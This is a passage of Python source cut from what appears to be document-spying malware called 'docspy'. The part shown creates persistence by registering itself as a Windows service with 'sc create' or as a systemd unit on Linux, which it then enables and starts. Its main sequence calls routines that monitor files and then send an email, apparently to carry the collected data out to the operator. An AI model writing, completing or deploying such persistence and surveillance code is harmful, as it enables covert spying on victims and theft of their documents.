            service_command = f'sc create {service_name} binPath= "{os.path.abspath(__file__)}"'
            subprocess.run(service_command, shell=True)
        elif system == 'Linux':
            service_name = 'docspy'
            service_command = f'echo "[Unit]\nDescription=Document Spy Service\n[Service]\nExecStart={os.path.abspath(__file__)}\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/{service_name}.service'
            subprocess.run(service_command, shell=True)
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', service_name])
            subprocess.run(['systemctl', 'start', service_name])

    # Start monitoring
    monitor_files()

    # Send email after monitoring
    send_email()

    # Create persistence
    create_persistence()
